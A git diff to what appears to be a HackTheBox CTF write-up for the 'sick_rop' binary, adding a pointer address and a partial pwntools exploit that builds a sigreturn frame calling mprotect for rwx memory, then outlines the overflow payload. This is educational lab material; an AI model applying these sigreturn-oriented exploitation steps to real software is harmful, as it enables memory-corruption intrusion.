@@ -64,6 +64,58 @@ Because we're changing the stack frame, we can't just use vuln_function for fram
 Hence we need to use the pointer address to the vuln_function.
 ```
 
-> GRABBING THE POINTER ADDRESS TO VULN FUNCTION (using peda, dunno how if using pwndbg).
+> GRABBING THE POINTER ADDRESS TO VULN FUNCTION (using peda, dunno how if using pwndbg). | ans --> 0x4010d8
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7a48fcf1-376e-428f-9b45-41f834802292)
+
+
+12. Here's our script so far:
+
+```py
+from pwn import *
+import os
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './sick_rop'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+sh = start()
+
+rop = ROP(elf)
+syscall = rop.find_gadget(['syscall', 'ret'])[0]
+info(f'SYSCALL GADGET --> {hex(syscall)}')
+
+vuln_pointer = 0x4010d8
+writeable_area = 0x400000
+
+frame = SigreturnFrame()
+frame.rax = 0xa #10 --> mprotect
+frame.rdi = writeable_area
+frame.rsi = 0x4000 # set size
+frame.rdx = 0x7 #7 --> initialize rwx access to what's rdi pointing to
+
+# because we're changing the stack frame
+# keep in mind --> calling the vuln function directly, won't get us to that function
+frame.rsp = vuln_pointer 
+frame.rip = syscall
+```
+
+13. Now, to craft our first payload. The formula is:
+
+```
+padding + vuln_function + syscall_ret + fake_stack_frame
+
+
+We need the padding to overflow until RIP, then we call vuln_function so we get the read function.
+Next we call the syscall_ret to execute the read and then we send in our fake_stack_frame as bytes obviously.
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8eb5c1b2-75c5-4a7f-bca1-161bc1bb8800)
+
